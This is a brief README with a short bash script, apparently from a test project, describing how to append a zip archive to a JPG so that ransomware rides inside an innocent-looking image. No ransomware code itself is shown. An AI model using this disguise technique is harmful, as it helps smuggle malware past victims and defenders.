This script is not needed to run the full test.

Compress /content/image
Once content.zip has been created run ./infection

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Infection is a bash file that embeds the ransomware into and image.

Once infection is ran you will have an image that is embed with ransomware.

~~~~~~~~~~~~~~~~~~~~~~Infection script below~~~~~~~~~~~~~~~~~~~~~~

#! /bin/bash

zip -m content.zip image

cat image.JPG content.zip > TheImage.jpg
